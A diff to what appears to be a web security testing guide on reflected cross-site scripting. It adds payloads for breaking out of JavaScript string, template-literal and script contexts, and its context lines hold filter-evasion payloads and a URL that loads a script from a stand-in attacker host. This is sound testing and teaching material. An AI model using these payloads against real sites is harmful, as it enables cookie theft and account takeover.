@@ -127,7 +127,49 @@ Then an attacker could submit the following code:
 " onfocus="alert(document.cookie)
 ```
 
-#### Example 4: Different Syntax or Encoding
+#### Example 4: JavaScript Context
+
+The input can also be reflected inside a script block, for example in a JavaScript string:
+
+```html
+<script>var q = 'INPUT_FROM_USER';</script>
+```
+
+Filtering `<` and `>` doesn't help here, as most of the payloads below use neither. HTML entity encoding isn't enough either, because the browser doesn't decode entities inside a script block: an encoded quote can't end the string, but payloads that need no HTML special characters still run. Find out how the value is quoted and which characters the application escapes, then try the following:
+
+- If quotes aren't escaped, end the string and comment out the rest of the line:
+
+  ```text
+  ';alert(document.cookie)//
+  ```
+
+- If quotes are escaped with a backslash but backslashes aren't, add a backslash of your own:
+
+  ```text
+  \';alert(document.cookie)//
+  ```
+
+  The application turns this into `\\';alert(document.cookie)//`, where `\\` is a literal backslash and the quote ends the string.
+
+- If quotes and backslashes are both escaped but `<` and `>` aren't, close the script block:
+
+  ```text
+  </script><script>alert(document.cookie)</script>
+  ```
+
+  The HTML parser ends the script block at the first `</script>`, before the JavaScript is parsed, so the unterminated string doesn't matter and the new script block runs.
+
+- If the value is inside a template literal, such as `` var q = `INPUT_FROM_USER`; ``, no quote is needed:
+
+  ```text
+  ${alert(document.cookie)}
+  ```
+
+- If the value isn't quoted at all, such as `var id = INPUT_FROM_USER;`, any expression runs, for example `alert(document.cookie)`.
+
+Inline event handlers such as `onclick` are different: they are HTML attributes, so the browser decodes HTML entities before it runs the JavaScript, and an encoded quote such as `&#39;` still ends the string.
+
+#### Example 5: Different Syntax or Encoding
 
 In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
 
@@ -137,7 +179,7 @@ Following some examples:
 - `"><ScRiPt>alert(document.cookie)</ScRiPt>`
 - `"%3cscript%3ealert(document.cookie)%3c/script%3e`
 
-#### Example 5: Bypassing Non-Recursive Filtering
+#### Example 6: Bypassing Non-Recursive Filtering
 
 Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:
 
@@ -145,7 +187,7 @@ Sometimes the sanitization is applied only once and it is not being performed re
 <scr<script>ipt>alert(document.cookie)</script>
 ```
 
-#### Example 6: Including External Script
+#### Example 7: Including External Script
 
 Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:
 
@@ -177,7 +219,7 @@ https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
 
 This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim site, `https://example/`.
 
-#### Example 7: HTTP Parameter Pollution (HPP)
+#### Example 8: HTTP Parameter Pollution (HPP)
 
 Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [HTTP Parameter pollution](04-HTTP_Parameter_Pollution.md) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.
 Regular attack:
